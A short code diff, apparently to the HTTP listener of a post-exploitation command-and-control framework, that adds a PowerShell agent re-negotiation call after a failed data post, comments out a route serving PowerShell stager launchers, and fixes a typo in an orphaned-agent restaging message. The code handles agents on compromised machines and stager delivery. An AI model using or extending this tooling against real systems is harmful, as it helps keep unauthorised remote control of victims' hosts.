@@ -708,6 +708,7 @@ class Listener:
                                 }
                                 catch [System.Net.WebException]{
                                     # exception posting data...
+                                    Start-Negotiate -S "$ser" -SK $SK -UA $ua
                                 }
                             }
                         }
@@ -801,13 +802,14 @@ def send_message(packets=None):
         self.app = app
 
 
-        @app.route('/<string:stagerURI>')
-        def send_stager(stagerURI):
-            if stagerURI:
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
-                return launcher
-            else:
-                pass
+        #@app.route('/<string:stagerURI>')
+        #def send_stager(stagerURI):
+            #if stagerURI:
+                #launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                #return launcher
+            #else:
+                #pass
+
         @app.before_request
         def check_ip():
             """
@@ -882,7 +884,7 @@ def send_message(packets=None):
 
                                 if 'not in cache' in results:
                                     # signal the client to restage
-                                    print helpers.color("[*] Orphaned agent from %s, signaling retaging" % (clientIP))
+                                    print helpers.color("[*] Orphaned agent from %s, signaling restaging" % (clientIP))
                                     return make_response(self.default_response(), 401)
                                 else:
                                     return make_response(self.default_response(), 200)
